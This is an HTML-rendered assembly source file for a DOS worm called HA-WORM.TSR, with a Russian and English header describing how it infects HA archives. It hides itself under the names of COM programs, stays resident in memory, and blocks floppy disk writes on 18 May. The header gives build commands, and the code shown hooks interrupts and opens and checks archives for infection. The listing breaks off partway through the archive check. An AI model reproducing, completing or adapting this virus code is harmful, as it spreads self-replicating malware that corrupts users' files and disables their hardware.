<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>havirus.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   HA-WORM.TSR. First, it looks into archive for any COM file,</span><span class="sc0">
</span><span class="sc1">;   then renames it to OVM and last, adds ifself into archive</span><span class="sc0">
</span><span class="sc1">;   under the original name. When user has executed an infected</span><span class="sc0">
</span><span class="sc1">;   file, virus installs itself into memory and then executes</span><span class="sc0">
</span><span class="sc1">;   original file (OVM). Thus, user thinks that all goes allright.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Еще один продукт на старую тему - червь в архивах. Хотя тема не совсем</span><span class="sc0">
</span><span class="sc1">; старая, я бы даже сказал - новая. Во-первых, червь заражает архивы HA, чего, по</span><span class="sc0">
</span><span class="sc1">; моим данным, еще никто не делал. Во-вторых, заражает он их не совсем обычным</span><span class="sc0">
</span><span class="sc1">; образом. Обычные черви добавляют себя в архив под случайным, либо, что еще</span><span class="sc0">
</span><span class="sc1">; хуже, под фиксированным именем, и еще далеко не факт, что пользователь запустит</span><span class="sc0">
</span><span class="sc1">; такой файл. Этот же червь проходит по всему архиву (разберая его формат) и ищет</span><span class="sc0">
</span><span class="sc1">; в нем файл с расширением COM. Далее он переименовывает этот файл (меняет</span><span class="sc0">
</span><span class="sc1">; расширение на OVM), а сам себя добавляет в архив под настоящим именем только</span><span class="sc0">
</span><span class="sc1">; что переименованного файла. В результате после распаковки архива в нем</span><span class="sc0">
</span><span class="sc1">; оказываются два файла вместо одного: ANYFILE.COM (это червь) и ANYFILE.OVM</span><span class="sc0">
</span><span class="sc1">; (это обычная программа). Но и это еще не все. Если запустить файл ANYFILE.COM,</span><span class="sc0">
</span><span class="sc1">; то тот, сделав все, что ему нужно, запускает файл ANYFILE.OVM, и у пользователя</span><span class="sc0">
</span><span class="sc1">; создается впечатление, что все идет нормально (ведь его то программа работает!)</span><span class="sc0">
</span><span class="sc1">; То есть получается, что это не просто червь, а червь-компаньон (по аналогии с</span><span class="sc0">
</span><span class="sc1">; обычными вирусами-компаньонами, но в архивах).</span><span class="sc0">
</span><span class="sc1">;    Вирус - резидентный. Заражает архивы HA при их открытии. Добавляет себя в</span><span class="sc0">
</span><span class="sc1">; архив по методу Stored (без архивации - как есть). Не изменяет атрибутов и</span><span class="sc0">
</span><span class="sc1">; времени создания архива. Не заражает архивы повторно, проверяя зараженность</span><span class="sc0">
</span><span class="sc1">; по последним двум байтам архива. 18 мая вирус устанавливает на Int 13h свой</span><span class="sc0">
</span><span class="sc1">; обработчик, который блокирует запись на дискеты (создается впечатление, что</span><span class="sc0">
</span><span class="sc1">; они защищены от записи).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                   DJ Sadovnikov (http://i.am/djsad), 17.02.2000</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;               Компилировать с помощью TASM 4.1+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                   tasm /m havirus.asm</span><span class="sc0">
</span><span class="sc1">;                   tlink /t /x havirus.obj</span><span class="sc0">
</span><span class="sc1">;                   del havirus.obj</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;               Файлы из архива:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                   havirus.asm 10090 (исходник вируса)</span><span class="sc0">
</span><span class="sc1">;                   havirus.com   709 (бинарник вируса)</span><span class="sc0">
</span><span class="sc1">;                   havirus.doc  1006 (техническая информация)</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">


</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">


</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDABh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Укорачиваем длину текущего блока памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Переставляем Int 21h на Int 65h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Ofs21h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seg21h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2565h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirSize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Помечаем блок памяти как системную область]</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус в выделенную память]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем новый обработчик Int 21h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Проверяем системную дату]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0807h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1805h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес старого обработчика Int 13h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3513h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Ofs13h</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seg13h</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем новый обработчик Int 13h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2513h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int13h</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Ищем имя файла]</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Loop1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0000</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found1</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Loop1</span><span class="sc0">
</span><span class="sc5">Found1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">


</span><span class="sc1">;[Ищем конец имени файла и меняем его расширение]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindZero</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'VO'</span><span class="sc0">


</span><span class="sc1">;[Подготавливаем блок параметров для запуска файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PBlock</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">


</span><span class="sc1">;[Запускаем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;[Блок параметров для запуска файла]</span><span class="sc0">

</span><span class="sc5">PBlock</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">5Ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">6Ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                ОБРАБОТЧИКИ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int13h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Protect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Protect</span><span class="sc0">

</span><span class="sc5">Quit</span><span class="sc10">$</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Ofs13h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Seg13h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Protect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotTest</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">NotTest</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FileOpen</span><span class="sc0">

</span><span class="sc5">QuitA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">
</span><span class="sc5">RestAttrA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestAttr</span><span class="sc0">
</span><span class="sc5">CloseA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Ищем конец имени файла]</span><span class="sc0">

</span><span class="sc5">FileOpen</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindZero</span><span class="sc0">


</span><span class="sc1">;[Проверяем тип файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'H.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">QuitA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">QuitA</span><span class="sc0">


</span><span class="sc1">;[Сохраняем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Обнуляем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttrA</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttrA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем время и дату создания файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">CloseA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель на 2 байта от конца файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем последние два байта]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read2</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Проверяем файл на зараженность]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'VO'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в начало файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем главный заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read2</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Это архив HA?]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'AH'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">
